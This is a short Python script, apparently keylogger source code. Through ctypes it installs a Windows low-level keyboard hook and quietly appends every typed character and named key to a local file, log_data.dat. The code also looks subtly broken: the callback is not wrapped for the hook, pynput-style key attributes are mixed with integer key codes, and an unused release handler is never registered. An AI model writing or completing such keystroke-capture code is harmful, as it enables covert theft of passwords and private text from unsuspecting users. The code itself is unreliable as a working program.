import sys
import ctypes
def on_press(key):
    try:
        with open("log_data.dat", "a") as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f"Logged: {key.char}")
            elif key.char in ['.', ',', '!', '?', ';', ':', '-', '_', '=', '+', '[', ']', '{', '}', '\\', '|', '/', '`', '~', '@', '#', '$', '%', '^', '&', '*', '(', ')']:
                f.write(key.char)
                print(f"Logged: {key.char}")
    except AttributeError:
        with open("log_data.dat", "a") as f:
            if key == 32:
                f.write(' ')
                print("Logged: [SPACE]")
            elif key == 13:
                f.write('\n')
                print("Logged: [ENTER]")
            elif key == 9:
                f.write('\t')
                print("Logged: [TAB]")
            else:
                f.write(f"[{ctypes.windll.user32.GetKeyNameTextW(key << 16, None, 0).upper()}]")
                print(f"Logged: [{ctypes.windll.user32.GetKeyNameTextW(key << 16, None, 0).upper()}]")
def on_release(key):
    if key == 27:
        return False
hook_id = ctypes.windll.user32.SetWindowsHookExW(13, on_press, None, 0)
ctypes.windll.kernel32.GetMessageW(None, 0, 0, 0)